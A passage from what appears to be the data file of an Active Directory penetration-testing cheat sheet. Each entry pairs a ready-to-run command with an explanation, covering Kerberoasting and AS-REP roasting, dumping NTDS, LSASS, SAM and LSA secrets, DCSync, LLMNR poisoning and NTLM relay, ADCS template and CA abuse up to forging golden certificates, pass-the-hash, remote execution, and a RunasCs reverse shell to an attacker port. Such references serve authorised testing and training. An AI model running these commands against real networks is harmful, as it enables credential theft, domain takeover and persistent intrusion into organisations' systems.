    command: "nxc smb $TARGET -u $USER -p $PASS -M spider_plus",
    description: "Module that recursively indexes every share it can reach and flags files worth pulling.",
    useCase: "Hunting for creds/configs across many hosts' shares at once instead of manual smbmap per host.",
  },
  {
    id: "nxc-ldap-users",
    tool: "NetExec (nxc)",
    phase: "recon",
    title: "Enumerate users via LDAP",
    command: "nxc ldap $TARGET -u $USER -p $PASS --users",
    description: "LDAP-based user enumeration, useful when SAMR is restricted but LDAP is open.",
    useCase: "Fallback enumeration path on hardened environments that block SAMR queries.",
  },
  {
    id: "bloodyad-writable",
    tool: "bloodyAD",
    phase: "recon",
    title: "Find objects you can write to",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get writable --detail",
    description: "Queries LDAP for every object where your account holds a write-capable ACE, and shows which specific right (GenericAll, GenericWrite, WriteOwner, etc.) applies.",
    useCase: "Turns an ACL abuse path from BloodHound into a concrete list of what you can actually change right now.",
  },
  {
    id: "bloodyad-get-object",
    tool: "bloodyAD",
    phase: "recon",
    title: "Dump attributes of a specific object",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object $USER --attr *",
    description: "Retrieves every LDAP attribute for a given user, group, or computer object.",
    useCase: "Inspecting an object's ACL, group membership, or UAC flags before deciding how to abuse it.",
  },

  // ============ CREDENTIAL ACCESS ============
  {
    id: "kerberoast-rubeus",
    tool: "Rubeus",
    phase: "cred",
    title: "Kerberoasting",
    command: "Rubeus.exe kerberoast /outfile:$OUTFILE",
    description: "Requests TGS tickets for every SPN-registered account; tickets are encrypted with the account's password hash and crackable offline.",
    useCase: "Any domain user can request these — effective against service accounts with weak passwords.",
  },
  {
    id: "impacket-getuserspns",
    tool: "Impacket (GetUserSPNs.py)",
    phase: "cred",
    title: "Kerberoasting from Linux",
    command: "GetUserSPNs.py $DOMAIN/$USER:$PASS -dc-ip $DC -request -outputfile $OUTFILE",
    description: "Python/Impacket equivalent of Rubeus kerberoast — lists SPN accounts and requests+dumps crackable TGS hashes in one pass.",
    useCase: "Same technique as Rubeus kerberoast, run from a Linux attack host.",
  },
  {
    id: "nxc-ldap-kerberoast",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Kerberoasting in one command",
    command: "nxc ldap $TARGET -u $USER -p $PASS --kerberoasting $OUTFILE",
    description: "Requests and dumps crackable TGS hashes for all SPN accounts in hashcat format.",
    useCase: "Fastest single-command kerberoast when you're already using nxc for enumeration.",
  },
  {
    id: "asreproast-rubeus",
    tool: "Rubeus",
    phase: "cred",
    title: "AS-REP roasting",
    command: "Rubeus.exe asreproast /format:hashcat /outfile:$OUTFILE",
    description: "Targets accounts with Kerberos pre-authentication disabled — their AS-REP is crackable offline with zero prior auth.",
    useCase: "Finding legacy/misconfigured accounts that skip pre-auth.",
  },
  {
    id: "impacket-getnpusers",
    tool: "Impacket (GetNPUsers.py)",
    phase: "cred",
    title: "AS-REP roasting from Linux",
    command: "GetNPUsers.py $DOMAIN/ -usersfile users.txt -no-pass -dc-ip $DC -format hashcat -outputfile $OUTFILE",
    description: "Checks a username list for pre-auth-disabled accounts and dumps crackable AS-REP hashes, no valid credential required.",
    useCase: "Works even with zero valid credentials — just needs a username list from earlier enumeration.",
  },
  {
    id: "nxc-ldap-asreproast",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "AS-REP roasting in one command",
    command: "nxc ldap $TARGET -u $USER -p $PASS --asreproast $OUTFILE",
    description: "Automatically finds pre-auth-disabled accounts and dumps their AS-REP hashes.",
    useCase: "Quick roast pass alongside kerberoasting when scripting a full nxc-based sweep.",
  },
  {
    id: "impacket-getnpusers-hash",
    tool: "Impacket (GetNPUsers.py)",
    phase: "cred",
    title: "AS-REP roasting with an authenticated bind",
    command: "GetNPUsers.py -request -format hashcat -outputfile $OUTFILE -hashes :$HASH -dc-ip $DC $DOMAIN/$USER",
    description: "Instead of a bare username list, this binds to LDAP with a known credential (here an NT hash) to dynamically query the full user list itself before checking each one for disabled pre-auth.",
    useCase: "Skipping the manual users.txt step entirely once you already hold any valid domain credential — the LDAP bind itself finds every candidate.",
  },
  {
    id: "impacket-getuserspns-no-preauth",
    tool: "Impacket (GetUserSPNs.py)",
    phase: "cred",
    title: "Kerberoast without any domain credential (no pre-auth)",
    command: "GetUserSPNs.py -no-preauth $USER -usersfile services.txt -dc-host $DC $DOMAIN/",
    description: "Abuses the fact that an AS-REQ can be used to pull a service ticket instead of the usual TGS-REQ, as long as the impersonated account ($USER) doesn't require Kerberos pre-authentication — meaning the whole kerberoast can be run without controlling any AD account at all, only knowing one AS-REP-roastable username and a list of target service accounts.",
    useCase: "Kerberoasting from a fully unauthenticated position, using an AS-REP-roastable account purely as a stepping stone to request tickets for other services.",
  },
  {
    id: "kerberoast-skelsec",
    tool: "kerberoast (skelsec)",
    phase: "cred",
    title: "Pure-Python kerberoast toolkit",
    command: "kerberoast spnroast \"kerberos+password://$DOMAIN\\\\$USER:$PASS@$DC\" -o $OUTFILE",
    description: "A dependency-light, pure-Python alternative to Impacket/Rubeus for kerberoasting, using the same msldap-style connection-string syntax as the author's other tools (pypykatz, msldap).",
    useCase: "Kerberoasting from environments where staging Impacket or Rubeus isn't practical.",
  },
  {
    id: "pypykatz-spnroast-rc4",
    tool: "pypykatz",
    phase: "cred",
    title: "Force RC4 kerberoast tickets even with AES enabled",
    command: "pypykatz kerberos spnroast -d $DOMAIN -t $TARGETOBJECT -e 23 \"kerberos+password://$DOMAIN/$USER:$PASS@$DC\"",
    description: "Explicitly requests etype 23 (RC4) service tickets instead of AES, if the target still accepts it — a krb5tgs$23$ hash cracks dramatically faster than the AES-based krb5tgs$18$ equivalent.",
    useCase: "Cutting kerberoast cracking time way down on a domain that hasn't disabled RC4, even though AES is also enabled.",
  },
  {
    id: "asrepcatcher-relay",
    tool: "ASRepCatcher",
    phase: "cred",
    title: "AS-REP roast via MitM, without pre-auth being disabled",
    command: "ASRepCatcher relay -dc $DC",
    description: "Sits as a man-in-the-middle (ARP spoofing by default) between clients and the DC and captures real AS-REPs off the wire, optionally downgrading the negotiated encryption to RC4 — works even when every account has Kerberos pre-authentication enabled.",
    useCase: "AS-REP roasting on domains where no account is actually pre-auth-disabled, by intercepting the legitimate exchange instead.",
  },
  {
    id: "asrepcatcher-listen",
    tool: "ASRepCatcher",
    phase: "cred",
    title: "Passively capture AS-REPs (no packet alteration)",
    command: "ASRepCatcher listen",
    description: "Passive mode — listens for AS-REP traffic and captures it without any ARP spoofing or encryption-downgrade tampering, for use once a MitM position already exists by other means.",
    useCase: "Quietly harvesting AS-REPs from an existing network tap/MitM position without adding any active interference.",
  },
  {
    id: "nxc-smb-sam",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Dump local SAM hashes",
    command: "nxc smb $TARGET -u $USER -p $PASS --sam",
    description: "Dumps the local SAM database (local account NTLM hashes) if you hold local admin on the target.",
    useCase: "Harvesting local admin hashes for password-reuse checks across the environment.",
  },
  {
    id: "nxc-smb-lsa",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Dump LSA secrets",
    command: "nxc smb $TARGET -u $USER -p $PASS --lsa",
    description: "Dumps LSA secrets — often includes cached service account passwords and autologon credentials stored in the registry.",
    useCase: "Frequently reveals plaintext service account passwords that Mimikatz/secretsdump would also find.",
  },
  {
    id: "nxc-smb-ntds",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Dump NTDS.dit (all domain hashes)",
    command: "nxc smb $DC -u $USER -p $PASS --ntds",
    description: "Remotely dumps every domain account's password hash from the NTDS database via DRSUAPI replication.",
    useCase: "Full domain credential dump — requires Domain Admin-equivalent rights, run against the DC.",
  },
  {
    id: "nxc-smb-lsassy",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Dump LSASS memory remotely",
    command: "nxc smb $TARGET -u $USER -p $PASS -M lsassy",
    description: "Remotely dumps and parses LSASS memory to extract plaintext creds, hashes, and Kerberos tickets without manual Mimikatz.",
    useCase: "Harvesting cached logon credentials from a remote box in one command.",
  },
  {
    id: "impacket-secretsdump-local",
    tool: "Impacket (secretsdump.py)",
    phase: "cred",
    title: "Dump SAM / LSA secrets remotely",
    command: "secretsdump.py $DOMAIN/$USER:$PASS@$TARGET",
    description: "Remotely dumps local SAM hashes and LSA secrets over SMB using registry hive reads — no agent needed.",
    useCase: "Standard first move once you have local admin on any single host.",
  },
  {
    id: "impacket-secretsdump-ntds",
    tool: "Impacket (secretsdump.py)",
    phase: "cred",
    title: "Dump full NTDS.dit via DRSUAPI",
    command: "secretsdump.py $DOMAIN/$USER:$PASS@$DC -just-dc",
    description: "Uses the Directory Replication Service Remote Protocol to pull every domain account hash directly from the DC, same technique DCSync uses.",
    useCase: "Complete domain compromise dump once you have Domain Admin or Replicating Directory Changes rights.",
  },
  {
    id: "impacket-secretsdump-hash",
    tool: "Impacket (secretsdump.py)",
    phase: "cred",
    title: "Dump using pass-the-hash",
    command: "secretsdump.py $DOMAIN/$USER@$TARGET -hashes :$HASH",
    description: "Same as the standard secretsdump but authenticates with an NTLM hash instead of a plaintext password.",
    useCase: "Chaining a previously dumped hash straight into another dump without cracking it first.",
  },
  {
    id: "mimikatz-sekurlsa",
    tool: "Mimikatz",
    phase: "cred",
    title: "Dump credentials from LSASS memory",
    command: "privilege::debug\nsekurlsa::logonpasswords",
    description: "Reads plaintext passwords, hashes, and Kerberos tickets held in memory by LSASS for logged-on sessions.",
    useCase: "Local admin on a box with cached interactive logons — harvest creds for lateral movement.",
  },
  {
    id: "mimikatz-dcsync",
    tool: "Mimikatz",
    phase: "cred",
    title: "DCSync",
    command: "lsadump::dcsync /domain:$DOMAIN /user:krbtgt",
    description: "Abuses Directory Replication Service rights to impersonate a domain controller and pull password hashes for any account, including krbtgt.",
    useCase: "Requires Replicating Directory Changes rights (default: Domain Admins) — grabs krbtgt for a golden ticket.",
  },
  {
    id: "responder",
    tool: "Responder",
    phase: "cred",
    title: "Poison LLMNR/NBT-NS for hash capture",
    command: "sudo responder -I $INTERFACE -dwP",
    description: "Answers broadcast name-resolution requests to trick hosts into authenticating to the attacker, capturing NetNTLM hashes. Needs root — it binds raw sockets on the chosen interface (e.g. tun0 on a VPN-connected pentest box, eth0/eth1 otherwise).",
    useCase: "Common on internal networks where LLMNR/NBT-NS fallback isn't disabled — passive credential harvesting.",
  },
  {
    id: "inveigh-capture",
    tool: "Inveigh",
    phase: "cred",
    title: "Poison LLMNR/NBNS/mDNS for hash capture (Windows-native)",
    command: "Invoke-Inveigh -NBNS Y -LLMNR Y -ConsoleOutput Y",
    description: "PowerShell-native equivalent of Responder — spoofs LLMNR/NBNS/mDNS from a Windows box, useful when the only foothold available is Windows and dropping a Linux binary isn't an option. A compiled C# version (Inveigh.exe) exists too, with a similar flag set.",
    useCase: "Passive hash capture from an already-compromised Windows host, without needing to pivot traffic back to a Linux attack box first.",
  },
  {
    id: "inveigh-view-hashes",
    tool: "Inveigh",
    phase: "cred",
    title: "View captured NTLMv2 hashes",
    command: "Get-InveighNTLMv2Unique",
    description: "Lists deduplicated NTLMv2 hashes captured by a running Invoke-Inveigh session, ready to copy out for offline cracking.",
    useCase: "Checking capture progress mid-engagement without stopping the poisoner.",
  },
  {
    id: "ntlmrelayx",
    tool: "Impacket (ntlmrelayx.py)",
    phase: "cred",
    title: "Relay captured NTLM auth",
    command: "sudo ntlmrelayx.py -tf targets.txt -smb2support",
    description: "Relays captured NTLM authentication to another host/service instead of cracking it, often landing SMB or LDAP access directly.",
    useCase: "Pair with Responder to relay a captured hash into shell access or LDAP write privileges (e.g. RBCD abuse).",
  },
  {
    id: "certipy-find",
    tool: "Certipy",
    phase: "cred",
    title: "Enumerate ADCS misconfigurations",
    command: "certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable",
    description: "Audits Active Directory Certificate Services templates for known escalation paths (ESC1–ESC11).",
    useCase: "ADCS is frequently misconfigured and gives a direct path to Domain Admin — always worth checking.",
  },
  {
    id: "certipy-req-esc1",
    tool: "Certipy",
    phase: "cred",
    title: "Request a cert impersonating another user (ESC1)",
    command: "certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -template 'VulnTemplate' -upn administrator@$DOMAIN",
    description: "Abuses a template that allows enrollee-supplied SAN plus client authentication EKU to request a cert for an arbitrary UPN — usually a Domain Admin.",
    useCase: "Classic ESC1 — turns low-priv enrollment rights on a misconfigured template into impersonation of any user.",
  },
  {
    id: "certipy-auth",
    tool: "Certipy",
    phase: "cred",
    title: "Authenticate with a certificate",
    command: "certipy auth -pfx $OUTFILE.pfx -dc-ip $DC",
    description: "Uses a requested/forged certificate to perform PKINIT and returns both a TGT and the account's NT hash.",
    useCase: "Converting a cert obtained via ESC1/ESC4/etc into a usable TGT and NTLM hash for further attacks.",
  },
  {
    id: "certipy-shadow",
    tool: "Certipy",
    phase: "cred",
    title: "Shadow credentials attack",
    command: "certipy shadow auto -u $USER@$DOMAIN -p $PASS -account $TARGETOBJECT -dc-ip $DC",
    description: "Writes a key credential to the target's msDS-KeyCredentialLink (same technique as bloodyAD shadowCredentials) and immediately retrieves its NT hash via PKINIT.",
    useCase: "One-command passwordless account takeover when you hold GenericWrite on a target user or computer.",
  },
  {
    id: "certipy-relay",
    tool: "Certipy",
    phase: "cred",
    title: "Relay NTLM auth to ADCS web enrollment",
    command: "certipy relay -ca $DC -template DomainController",
    description: "Listens for relayed NTLM authentication (e.g. via PetitPotam/PrinterBug coercion) and forwards it straight to the ADCS HTTP enrollment endpoint to mint a certificate as the coerced account.",
    useCase: "Chains a coercion technique into instant certificate-based takeover of a domain controller machine account.",
  },
  {
    id: "certipy-template-esc4",
    tool: "Certipy",
    phase: "privesc",
    title: "Overwrite a template's security (ESC4)",
    command: "certipy template -u $USER@$DOMAIN -p $PASS -dc-ip $DC -template 'VulnTemplate' -write-default-configuration",
    description: "If you hold write access to a certificate template object itself, reconfigures it into an ESC1-exploitable state, automatically backing up the original config to restore afterward. Certipy v5 renamed this from the older -save-old flag — running it twice overwrites the backup, so keep a second copy of the original JSON somewhere safe.",
    useCase: "Turning template write-access (WriteOwner/GenericWrite on the template object) into full impersonation capability.",
  },
  {
    id: "modifycerttemplate-disable-approval",
    tool: "modifyCertTemplate",
    phase: "privesc",
    title: "Precisely disable Manager Approval on a template",
    command: "modifyCertTemplate.py -template TemplateName -value 0 -property mspki-enrollment-flag $DOMAIN/$USER:$PASS",
    description: "A more surgical alternative to Certipy's all-in-one ESC4 reconfiguration — edits exactly one attribute at a time, useful when only a specific flag needs flipping rather than the full ESC1-style rewrite.",
    useCase: "Fine-grained ESC4 exploitation when a template only needs one or two settings changed, minimizing the footprint left on the template object.",
  },
  {
    id: "modifycerttemplate-disable-signature",
    tool: "modifyCertTemplate",
    phase: "privesc",
    title: "Disable the Authorized Signature requirement",
    command: "modifyCertTemplate.py -template TemplateName -value 0 -property mspki-ra-signature $DOMAIN/$USER:$PASS",
    description: "Removes the requirement that a request be co-signed by an existing authorized certificate before the CA will issue — another individual precondition for turning a template ESC1-vulnerable.",
    useCase: "Clearing the signature requirement as one discrete step of a manual ESC4 reconfiguration.",
  },
  {
    id: "modifycerttemplate-enable-san",
    tool: "modifyCertTemplate",
    phase: "privesc",
    title: "Enable SAN specification (ENROLLEE_SUPPLIES_SUBJECT)",
    command: "modifyCertTemplate.py -template TemplateName -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag $DOMAIN/$USER:$PASS",
    description: "Flips the specific flag that allows a requester to supply their own SAN at enrollment time — the core ESC1 primitive, added here to one attribute at a time rather than via Certipy's full template rewrite.",
    useCase: "The one flag that actually matters if the template already has authentication EKUs and low-priv enrollment — sometimes this alone is enough.",
  },
  {
    id: "modifycerttemplate-add-eku",
    tool: "modifyCertTemplate",
    phase: "privesc",
    title: "Add an authentication EKU to a template",
    command: "modifyCertTemplate.py -template TemplateName -value \"'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'\" -property pKIExtendedKeyUsage $DOMAIN/$USER:$PASS",
    description: "Adds Client Authentication and PKINIT Client Authentication EKUs to a template's pKIExtendedKeyUsage, in case the target template didn't already specify an authentication-capable purpose.",
    useCase: "Completing the ESC4 reconfiguration when a template allows SAN specification but doesn't yet grant an authentication-capable EKU.",
  },
  {
    id: "certipy-ca-backup",
    tool: "Certipy",
    phase: "persist",
    title: "Back up the CA's private key",
    command: "certipy ca -backup -u $USER@$DOMAIN -p $PASS -ca 'CA-NAME'",
    description: "Exports the Certificate Authority's private key and certificate if you hold admin rights on the CA server.",
    useCase: "With the CA key in hand you can forge certificates for any user offline — the ultimate ADCS persistence.",
  },
  {
    id: "certipy-forge",
    tool: "Certipy",
    phase: "persist",
    title: "Forge a golden certificate offline",
    command: "certipy forge -ca-pfx ca.pfx -upn administrator@$DOMAIN -subject 'CN=administrator,CN=Users,DC=corp,DC=local'",
    description: "Uses a stolen CA private key to mint a fresh, fully valid certificate for any user, entirely offline — never touches the DC until it's used to authenticate.",
    useCase: "Domain-wide persistence that survives password and even krbtgt rotations, as long as the CA key isn't rotated.",
  },
  {
    id: "reg-read-editflags",
    tool: "Impacket (reg.py)",
    phase: "recon",
    title: "Read the CA's EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag",
    command: "reg.py $DOMAIN/$USER:$PASS@$TARGET query -keyName 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\CA-NAME\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy' -v editflags",
    description: "Remotely reads the CA's editflags registry value — bit 0x40000 is EDITF_ATTRIBUTESUBJECTALTNAME2, the flag ESC6 depends on. Requires local admin (or equivalent remote registry access) on the CA server.",
    useCase: "Confirming the current editflags value before ORing in the ESC6 bit, so the write doesn't clobber unrelated flags already set.",
  },
  {
    id: "reg-set-editflags",
    tool: "Impacket (reg.py)",
    phase: "privesc",
    title: "Set the ESC6 flag and restart CertSvc",
    command: "reg.py $DOMAIN/$USER:$PASS@$TARGET add-keyName 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\CA-NAME\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd <VALUE-OR-ed-0x40000>",
    description: "Writes editflags back with EDITF_ATTRIBUTESUBJECTALTNAME2 bitwise-ORed into whatever was already set (compute the new value as VALUE | 0x40000 first) — the CA only picks this up after CertSvc is restarted, which requires the same admin-level access.",
    useCase: "ESC7 Path 1 — turning ManageCA/local-admin-plus-restart-rights into a CA-wide ESC6 condition on demand.",
  },
  {
    id: "certipy-ca-add-officer",
    tool: "Certipy",
    phase: "privesc",
    title: "Grant yourself Manage Certificates (Officer) rights",
    command: "certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -add-officer $USER",
    description: "With ManageCA rights on the CA object, remotely adds yourself as a Certificate Manager (\"Officer\") — the second right needed, alongside ManageCA, to approve a denied SubCA enrollment request.",
    useCase: "Setting up ESC7 Path 2 (the SubCA abuse) when you only started with ManageCA and not ManageCertificates.",
  },
  {
    id: "certipy-ca-list-templates",
    tool: "Certipy",
    phase: "recon",
    title: "List and enable/disable templates on a CA",
    command: "certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -list-templates",
    description: "Lists every template currently enabled on the CA — with ManageCA rights, -enable-template/-disable-template can also toggle which ones are active, including re-enabling the restricted SubCA template if it was disabled.",
    useCase: "Confirming SubCA (or another restricted template) is enabled before attempting to enroll against it.",
  },
  {
    id: "certipy-ca-issue-retrieve",
    tool: "Certipy",
    phase: "privesc",
    title: "Approve and retrieve a denied SubCA request",
    command: "certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC -target $TARGET -ca 'CA-NAME' -issue-request 100",
    description: "SubCA enrollment is restricted to Domain/Enterprise Admins, so a standard user's request fails with CERTSRV_E_TEMPLATE_DENIED — but a request ID is still issued. With both ManageCA and ManageCertificates, this approves that denied request anyway; follow with `certipy req ... -retrieve 100` to pull down the now-issued certificate.",
    useCase: "The actual privilege-escalation step of ESC7 Path 2 — converting a rejected enrollment into a real, usable certificate via CA-level approval rights.",
  },
  {
    id: "certipy-account",
    tool: "Certipy",
    phase: "cred",
    title: "Read/modify account UAC flags via LDAP",
    command: "certipy account update -u $USER@$DOMAIN -p $PASS -user $TARGETOBJECT -dont-req-preauth true",
    description: "Reads or modifies account attributes (e.g. flipping DONT_REQ_PREAUTH) over LDAP using Certipy's account module.",
    useCase: "Setting up a target account for AS-REP roasting when you hold write rights on it, without needing separate LDAP tooling.",
  },
  {
    id: "bloodyad-set-password",
    tool: "bloodyAD",
    phase: "cred",
    title: "Reset a user's password over LDAP",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS set password $TARGETOBJECT 'NewPassw0rd!'",
    description: "Changes a target account's password via LDAP if you hold ForceChangePassword/GenericWrite rights on it — no need to know the old password.",
    useCase: "Fastest way to take over an account once BloodHound shows you a write-capable ACE on it.",
  },
  {
    id: "bloodyad-shadow-creds",
    tool: "bloodyAD",
    phase: "cred",
    title: "Shadow credentials attack",
    command: "bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add shadowCredentials $TARGETOBJECT",
    description: "Writes a certificate into the target account's msDS-KeyCredentialLink attribute, then lets you request a TGT for it via PKINIT — effectively a passwordless takeover.",
    useCase: "Compromising an account with GenericWrite without ever touching or resetting its password, keeping the attack far quieter.",
  },
  {
    id: "hashcat-kerberoast",
    tool: "Hashcat",
    phase: "cred",
    title: "Crack kerberoast / AS-REP hashes",
    command: "hashcat -m 13100 $OUTFILE wordlist.txt -O",
    description: "Mode 13100 cracks kerberoast TGS hashes offline; use mode 18200 for AS-REP hashes instead.",
    useCase: "Turning the hashes pulled by Rubeus/Impacket/nxc into plaintext passwords.",
  },
  {
    id: "john-kerberoast",
    tool: "JohnTheRipper",
    phase: "cred",
    title: "Crack kerberoast hashes with John",
    command: "john --format=krb5tgs --wordlist=wordlist.txt $OUTFILE",
    description: "Hashcat alternative for cracking kerberoast TGS hashes — explicit --format is required since John won't always auto-detect the krb5tgs hash type.",
    useCase: "Cracking kerberoast/AS-REP hashes on a box where Hashcat (or GPU acceleration) isn't available but John is.",
  },
  {
    id: "john-asreproast",
    tool: "JohnTheRipper",
    phase: "cred",
    title: "Crack AS-REP hashes with John",
    command: "john --wordlist=wordlist.txt $OUTFILE",
    description: "John auto-detects the krb5asrep hash format from hashcat-mode output, so no explicit --format flag is needed here the way kerberoast hashes require one.",
    useCase: "Same CPU-based cracking fallback as the kerberoast John entry, for AS-REP hashes specifically.",
  },
  {
    id: "timeroast-unauth",
    tool: "Timeroast",
    phase: "cred",
    title: "Timeroasting — unauthenticated hash extraction",
    command: "timeroast.py $DC",
    description: "Abuses MS-SNTP: any unauthenticated client can ask a DC to time-stamp a request 'on behalf of' any RID, and the DC replies with a MAC computed from that computer account's NT hash — extracting crackable hashes for every machine account with zero credentials.",
    useCase: "Initial-access-stage hash harvesting with literally no foothold at all, at the cost of only getting RIDs back instead of resolved computer names.",
  },
  {
    id: "nxc-timeroast",
    tool: "NetExec (nxc)",
    phase: "cred",
    title: "Timeroasting via NetExec's built-in module",
    command: "nxc smb $DC -M timeroast",
    description: "Runs the same unauthenticated MS-SNTP hash-harvesting technique as timeroast.py, built into NetExec's module system instead of a standalone script.",
    useCase: "One less tool to stage when NetExec is already the primary driver for a recon/attack pass.",
  },
  {
    id: "invoke-authenticatedtimeroast",
    tool: "Invoke-AuthenticatedTimeRoast",
    phase: "cred",
    title: "Timeroasting with automatic RID-to-hostname resolution",
    command: "Invoke-AuthenticatedTimeRoast -DomainController $DC -GenerateWordlist",
    description: "With valid domain credentials, this resolves every extracted RID straight to its computer account name via AD queries (no manual correlation needed), and can additionally emit a wordlist built from computer names for cracking machine accounts whose password matches their hostname.",
    useCase: "A much quieter, faster-to-crack alternative to computer-account kerberoasting once you already hold any domain credential — same idea, far less network noise.",
  },
  {
    id: "hashcat-timeroast",
    tool: "Hashcat",
    phase: "cred",
    title: "Crack SNTP (Timeroast) hashes",
    command: "hashcat -m 31300 -a 0 -O $OUTFILE wordlist.txt --username",
    description: "Mode 31300 cracks the MS-SNTP MAC hashes Timeroasting extracts — roughly 10x faster per-guess than a kerberoast TGS-REP hash. Requires Hashcat v7.0.0+; --username is needed because the hash file uses RIDs in place of usernames.",
    useCase: "Cracking computer-account passwords pulled via Timeroasting far faster than an equivalent kerberoast hash would allow.",
  },
  {
    id: "timecrack",
    tool: "timecrack (Timeroast)",
    phase: "cred",
    title: "Dictionary-crack SNTP hashes without Hashcat",
    command: "timecrack.py $OUTFILE wordlist.txt",
    description: "A slower, pure-Python dictionary-attack fallback for SNTP hashes when Hashcat 7.0+ (mode 31300) isn't available.",
    useCase: "Cracking Timeroast hashes on a box without a recent-enough Hashcat build or GPU to make mode 31300 worthwhile.",
  },
  {
    id: "pcredz-pcap",
    tool: "Pcredz",
    phase: "cred",
    title: "Extract credentials from a pcap file",
    command: "Pcredz -f capture.pcap",
    description: "Parses a saved pcap (or, with -d, every pcap in a folder) for cleartext creds, hashes, and other credential material found in plaintext protocols and Kerberos/NTLM exchanges.",
    useCase: "Pulling credentials out of packet captures you already have — from another tool's traffic capture, a SPAN port dump, or a client's provided pcap.",
  },
  {
    id: "pcredz-live",
    tool: "Pcredz",
    phase: "cred",
    title: "Extract credentials from a live capture",
    command: "Pcredz -i $INTERFACE -v",
    description: "Same credential-extraction engine as the pcap-file mode, but sniffing live traffic directly off a network interface instead of a saved capture.",
    useCase: "Passively harvesting credentials in real time while sitting on a network segment, without needing to capture-then-analyze in two separate steps.",
  },

  // ============ LATERAL MOVEMENT ============
  {
    id: "nxc-smb-spray",
    tool: "NetExec (nxc)",
    phase: "lateral",
    title: "Validate credential across many hosts",
    command: "nxc smb $TARGET -u $USER -p $PASS --continue-on-success",
    description: "Tests one credential (or hash) against every host in scope over SMB in a single pass.",
    useCase: "Checking how far a single found credential reaches across the environment.",
  },
  {
    id: "nxc-smb-pth",
    tool: "NetExec (nxc)",
    phase: "lateral",
    title: "Pass-the-hash across hosts",
    command: "nxc smb $TARGET -u $USER -H $HASH",
    description: "Authenticates with an NTLM hash instead of a password, same technique as Mimikatz pth but scriptable across a whole subnet.",
    useCase: "Spraying a dumped hash across the environment to find where else it works.",
  },
  {
    id: "nxc-smb-exec",
    tool: "NetExec (nxc)",
    phase: "lateral",
    title: "Execute a command remotely",
    command: "nxc smb $TARGET -u $USER -p $PASS -x \"whoami /all\"",
    description: "Runs a single command on the target via SMB (like a lightweight psexec) and returns the output.",
    useCase: "Fast one-off command execution without dropping into an interactive shell.",
  },
  {
    id: "nxc-winrm",
    tool: "NetExec (nxc)",
    phase: "lateral",
    title: "Check / execute over WinRM",
    command: "nxc winrm $TARGET -u $USER -p $PASS -x \"whoami\"",
    description: "Validates credentials against WinRM and can execute commands, useful when SMB is locked down but WinRM is open.",
    useCase: "Alternative lateral movement path on hosts with WinRM enabled for remote management.",
  },
  {
    id: "impacket-psexec",
    tool: "Impacket (psexec.py)",
    phase: "lateral",
    title: "Remote command execution via SMB",
    command: "psexec.py $DOMAIN/$USER:$PASS@$TARGET",
    description: "Drops a service binary over SMB/ADMIN$ and executes commands via the Service Control Manager.",
    useCase: "Interactive-ish SYSTEM shell on a remote host when you hold local admin creds.",
  },
  {
    id: "impacket-wmiexec",
    tool: "Impacket (wmiexec.py)",
    phase: "lateral",
    title: "Remote execution via WMI",
    command: "wmiexec.py $DOMAIN/$USER@$TARGET -hashes :$HASH",
    description: "Executes commands through WMI instead of dropping a service, leaving a lighter forensic footprint than psexec.",
    useCase: "Lateral movement using pass-the-hash without touching disk on the target.",
  },
  {
    id: "impacket-smbexec",
    tool: "Impacket (smbexec.py)",
    phase: "lateral",
    title: "Semi-interactive shell via SMB",
    command: "smbexec.py $DOMAIN/$USER:$PASS@$TARGET",
    description: "Similar to psexec but avoids writing the binary to disk on the target, executing commands via a temporary service instead.",
    useCase: "Lower forensic footprint alternative to psexec.py.",
  },
  {
    id: "impacket-atexec",
    tool: "Impacket (atexec.py)",
    phase: "lateral",
    title: "Execute via scheduled task",
    command: "atexec.py $DOMAIN/$USER:$PASS@$TARGET \"whoami\"",
    description: "Runs a one-off command by creating a scheduled task through the Task Scheduler service, then captures the output.",
    useCase: "Execution path that doesn't touch SMB shares directly — useful when other exec methods are monitored.",
  },
  {
    id: "evil-winrm",
    tool: "evil-winrm",
    phase: "lateral",
    title: "WinRM shell",
    command: "evil-winrm -i $TARGET -u $USER -p $PASS",
    description: "Interactive PowerShell-like shell over WinRM (port 5985/5986), with upload/download built in.",
    useCase: "Cleaner and more stable than PsExec-style shells when WinRM is enabled on the target.",
  },
  {
    id: "runascs",
    tool: "RunasCs",
    phase: "lateral",
    title: "Run a command as another user without a full logon session",
    command: "RunasCs.exe $USER $PASS cmd.exe -r $ATTACKER:4444",
    description: "Alternative to the built-in runas.exe that calls CreateProcessWithLogonW directly instead of going through the interactive logon UI — works over an existing non-interactive shell (no password prompt), supports NTLM hashes via --logon-type, and isn't blocked by 'Deny access to this computer from the network' the way some other execution methods are.",
    useCase: "Switching to a different local/domain account's context from an already-popped non-interactive shell (webshell, C2 implant) where runas.exe's interactive prompt isn't usable.",
  },
  {
    id: "pssession-interactive",
    tool: "PowerShell Remoting",
    phase: "lateral",
    title: "Interactive PowerShell session over WinRM",
    command: "Enter-PSSession -ComputerName $TARGET -Credential $DOMAIN\\$USER",
    description: "Built into every modern Windows box with WinRM enabled — no separate tool needed, unlike evil-winrm which requires a Ruby install. Prompts for the credential interactively unless piped a stored PSCredential object.",
